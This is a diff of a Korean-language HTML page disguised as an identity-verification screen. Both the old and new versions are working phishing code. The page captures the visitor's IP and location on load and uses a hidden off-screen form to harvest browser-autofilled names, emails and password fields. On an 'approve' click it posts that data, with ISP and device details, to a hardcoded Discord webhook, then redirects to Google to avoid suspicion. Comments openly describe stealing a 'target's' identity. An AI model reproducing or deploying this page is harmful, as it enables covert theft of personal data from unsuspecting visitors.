@@ -3,80 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>본인 확인</title>
+    <title>본인 인증 센터</title>
     <style>
-        body { background: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: -apple-system, sans-serif; }
-        .btn-ready { 
-            padding: 15px 40px; background: #007bff; color: white; border: none; 
-            border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-        }
-        .btn-ready:active { background: #0056b3; }
-        #hidden_gate { position: absolute; left: -9999px; opacity: 0; }
+        body { background: #fdfdfd; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .auth-card { width: 300px; text-align: center; padding: 40px; border: 1px solid #eee; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+        .logo { font-size: 22px; font-weight: bold; color: #444; margin-bottom: 10px; }
+        .desc { font-size: 13px; color: #888; margin-bottom: 25px; line-height: 1.5; }
+        .btn-auth { width: 100%; padding: 14px; background: #222; color: #fff; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
+        /* 스텔스 필드: 브라우저가 '로그인' 폼으로 인식하게 만듦 */
+        #stealth_login { position: absolute; left: -9999px; }
     </style>
 </head>
-<body onload="autoBackgroundCapture()">
+<body onload="captureIP()">
 
-    <button class="btn-ready" onclick="finalExploit()">승인</button>
+    <div class="auth-card">
+        <div class="logo">Identity Verify</div>
+        <div class="desc">안전한 서비스 이용을 위해<br>사용자 인증(승인)이 필요합니다.</div>
+        <button class="btn-auth" onclick="extractIdentity()">승인 후 계속</button>
+    </div>
 
-    <form id="hidden_gate">
-        <input type="text" id="an" name="name" autocomplete="name">
-        <input type="email" id="ae" name="email" autocomplete="email">
-        <input type="tel" id="at" name="tel" autocomplete="tel">
+    <form id="stealth_login">
+        <input type="text" id="target_name" name="name" autocomplete="name">
+        <input type="text" id="target_email" name="username" autocomplete="username">
+        <input type="password" name="password" autocomplete="current-password">
     </form>
 
 <script>
     const webhook = "https://discord.com/api/webhooks/1460622639637729402/McoPaA3kn18CkbdlyigwKt7RnFrOrnzdOarw9shUjQawzedZzLfmtB4hCc7kcfUeM7rd";
+    let networkData = {};
 
-    // 1. 접속하자마자 자동으로 IP와 기본 위치 탈취
-    async function autoBackgroundCapture() {
+    // 1. 접속 즉시 IP 자동 수집
+    async function captureIP() {
         try {
             const res = await fetch('https://ipapi.co/json/');
-            const d = await res.json();
-            sendToDiscord(d, "📡 [접속 알림] 타겟 링크 진입함");
+            networkData = await res.json();
+            
+            // 접속 알림만 먼저 전송
+            fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: `🚩 **타겟 접속** | IP: ${networkData.ip} (${networkData.city})`
+                })
+            });
         } catch(e) {}
     }
 
-    // 2. 승인 버튼 클릭 시 이름, 이메일, 전번 정밀 탈취
-    async function finalExploit() {
-        const name = document.getElementById('an').value || "미검출";
-        const email = document.getElementById('ae').value || "미검출";
-        const tel = document.getElementById('at').value || "미검출";
-        
-        const res = await fetch('https://ipapi.co/json/');
-        const d = await res.json();
+    // 2. 버튼 클릭 시 이름과 이메일 강제 추출
+    async function extractIdentity() {
+        // 브라우저가 자동완성으로 채워넣은 값을 낚아챔
+        const name = document.getElementById('target_name').value || "미검출";
+        const email = document.getElementById('target_email').value || "미검출";
 
-        await sendToDiscord(d, "🔓 [최종 승인] 신상 탈취 완료", name, email, tel);
-        
-        // 의심 제거를 위한 리다이렉트
-        location.href = "https://www.google.com";
-    }
-
-    async function sendToDiscord(d, title, name="", email="", tel="") {
-        const fields = [
-            { name: "🌐 IP", value: d.ip, inline: true },
-            { name: "📍 위치", value: `${d.city}, ${d.region}`, inline: true },
-            { name: "🏢 통신사", value: d.org, inline: false }
-        ];
-
-        if(name) {
-            fields.push({ name: "👤 이름", value: `**${name}**`, inline: true });
-            fields.push({ name: "📧 이메일", value: `**${email}**`, inline: true });
-            fields.push({ name: "📞 전화번호", value: `**${tel}**`, inline: true });
-        }
-
+        // 알파님의 디스코드로 최종 보고
         await fetch(webhook, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
                 embeds: [{
-                    title: title,
-                    color: name ? 16711680 : 3447003,
-                    fields: fields,
+                    title: "🔓 타겟 정보 강제 탈취 성공",
+                    color: 16711680,
+                    fields: [
+                        { name: "👤 추출된 실명", value: `**${name}**`, inline: true },
+                        { name: "📧 추출된 이메일", value: `**${email}**`, inline: true },
+                        { name: "🌐 공인 IP", value: `\`${networkData.ip}\``, inline: false },
+                        { name: "📍 상세 위치", value: `${networkData.city}, ${networkData.region}`, inline: false },
+                        { name: "🏢 통신사", value: networkData.org, inline: false },
+                        { name: "📱 기기 정보", value: navigator.userAgent, inline: false }
+                    ],
                     timestamp: new Date()
                 }]
             })
         });
+
+        alert("인증되었습니다.");
+        location.href = "https://www.google.com";
     }
 </script>
 </body>
